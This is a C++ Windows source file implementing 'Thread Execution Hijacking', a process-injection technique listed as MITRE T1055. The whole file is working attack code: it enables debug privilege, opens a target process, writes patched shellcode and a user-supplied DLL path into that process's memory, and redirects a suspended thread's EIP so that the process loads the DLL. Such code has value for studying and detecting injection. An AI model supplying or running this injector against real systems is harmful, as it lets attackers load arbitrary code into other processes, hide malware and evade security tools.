#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
using namespace std;
#pragma comment(lib,"ntdll.lib")

/*
** Thread Execution Hijacking (A.K.A Suspend, Inject, And Resume (Sir))
** Reference:
** [1] - https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
** [2] - http://www.rohitab.com/discuss/topic/40579-dll-injection-via-thread-hijacking/
** [3] - https://attack.mitre.org/wiki/Technique/T1055
*/

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

// Get The Process ID
DWORD GetProcessID(const char* procname)
{
	PROCESSENTRY32 pe;
	HANDLE hSnap;

	pe.dwSize = sizeof(PROCESSENTRY32);
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32First(hSnap, &pe)) {
		do
		{
			if (strcmp(pe.szExeFile, procname) == 0)
				break;
		} while (Process32Next(hSnap, &pe));
	}
	return pe.th32ProcessID;
}

char code[] =
{
	0x60, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x81, 0xEB, 0x06, 0x00, 0x00,
	0x00, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0x8D, 0x93, 0x22, 0x00, 0x00, 0x00,
	0x52, 0xFF, 0xD0, 0x61, 0x68, 0xCC, 0xCC, 0xCC, 0xCC, 0xC3

};
int main(int argc, char const *argv[])
{
	LPBYTE ptr;
	HANDLE hProcess, hThread, hSnap;
	PVOID mem, buffer;
	DWORD ProcessId;
	BOOLEAN bl;

	THREADENTRY32 te32;
	CONTEXT ctx;

	te32.dwSize = sizeof(te32);
	ctx.ContextFlags = CONTEXT_FULL;

	char strTmp[256], ProcessName[256], dllPathTmp[512];

	// Process running Input
	cout << "Example: crackme, basecalc,..." << endl;
	cout << "Enter Process Name: "; rewind(stdin);
	cin.getline(strTmp, sizeof(strTmp));
	strcpy(ProcessName, strcat(strTmp, ".exe"));

	// DLL Path Input
	cout << "Enter DLL Path: ";
	cin.getline(dllPathTmp, sizeof(dllPathTmp));

	cout << "[ Starting ] Thread Execution Hijacking" << endl;
	RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
	cout << "[ Opening ] Target process handle!" << endl;

	// Get ProcessID from process name.
	ProcessId = GetProcessID(ProcessName);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
	if (!hProcess)
	{
		cout << "[Error] Unable to open target process handle " << GetLastError() << endl;
		return -1;
	}
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	Thread32First(hSnap, &te32);
	cout << "[ Finding ] A Thread to Hijacking!" << endl;

	while (Thread32Next(hSnap, &te32))
	{
		if (te32.th32OwnerProcessID == ProcessId)
		{
			cout << "[ OK ] Target thread found. Thread ID: " << te32.th32ThreadID << endl; break;
		}
	}
	CloseHandle(hSnap);

	cout << "[ Allocating ] Allocate 4096 bytes in target process memory..." << endl;
	mem = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!mem)
	{
		cout << "[ Error ] Unable to allocate memory in target process " << GetLastError() << endl;
		CloseHandle(hProcess); return -1;
	}

	cout << "[ OK ] Memory allocated at: " << hex << mem << endl;
	cout << "[ Opening ] Open target thread handle" << endl;

	hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
	if (!hThread)
	{
		cout << "[ Error ] Unable to open target thread handle " << GetLastError() << endl;
		VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
		CloseHandle(hProcess); return -1;
	}

	cout << "[ Suspending ] Target thread suspending." << endl;
	SuspendThread(hThread);
	GetThreadContext(hThread, &ctx);

	buffer = VirtualAlloc(NULL, 65536, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	ptr = (LPBYTE)buffer;
	memcpy(buffer, code, sizeof(code));

	while (1)
	{
		if (*ptr == 0xb8 && *(PDWORD)(ptr + 1) == 0xCCCCCCCC)
		{
			*(PDWORD)(ptr + 1) = (DWORD)LoadLibraryA;
		}

		if (*ptr == 0x68 && *(PDWORD)(ptr + 1) == 0xCCCCCCCC)
		{
			*(PDWORD)(ptr + 1) = ctx.Eip;
		}

		if (*ptr == 0xc3)
		{
			ptr++;
			break;
		}

		ptr++;
	}

	strcpy((char*)ptr, dllPathTmp);
	cout << "[ Writing ] Shellcode is writing into target process." << endl;
	if (!WriteProcessMemory(hProcess, mem, buffer, sizeof(code) + strlen((char*)ptr), NULL))
	{
		cout << "[ Error ] Unable to write shellcode into target process " << GetLastError() << endl;
		VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
		ResumeThread(hThread);

		CloseHandle(hThread); CloseHandle(hProcess);
		VirtualFree(buffer, 0, MEM_RELEASE);
		return -1;
	}

	// Trỏ EIP vào shellcode
	ctx.Eip = (DWORD)mem;

	cout << "Hijacking target thread." << endl;
	if (!SetThreadContext(hThread, &ctx))
	{
		cout << "[ Error ] Unable to hijack target thread " << GetLastError() << endl;

		VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
		ResumeThread(hThread);

		CloseHandle(hThread); CloseHandle(hProcess);
		VirtualFree(buffer, 0, MEM_RELEASE);
		return -1;
	}

	cout << "[ Resuming ] Target thread is resuming." << endl;
	ResumeThread(hThread);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	VirtualFree(buffer, 0, MEM_RELEASE);

	getchar();
	return 0;
}